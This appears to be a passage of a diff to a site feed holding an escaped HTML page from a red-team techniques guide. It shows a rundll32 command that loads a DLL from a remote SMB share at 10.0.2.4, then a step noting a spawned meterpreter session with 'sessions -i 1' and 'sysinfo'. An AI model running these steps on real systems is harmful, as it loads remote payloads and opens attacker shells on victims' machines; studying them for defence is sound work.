+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ rundll32.exe &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.0.2.4&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;JXb&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;est.dll,0&lt;span class=&#34;o&#34;&gt;](&lt;/span&gt;file://10.0.2.4/HJXb/test.dll,0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h5&gt;STEP 3: We can observe that a new meterpreter session has been spawned.&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;step-3-we-can-observe-that-a-new-meterpreter-session-has-been-spawned&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#step-3-we-can-observe-that-a-new-meterpreter-session-has-been-spawned&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h5&gt;&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ sessions -i &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ sysinfo&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copy code&#34;
+    aria-label=&#34;Copy code&#34;
+    data-copied-label=&#34;Copied!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/docs/03_techniques/assets/Pasted_image_20261122002211.png&#34; alt=&#34;&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 
       </description>
     </item>
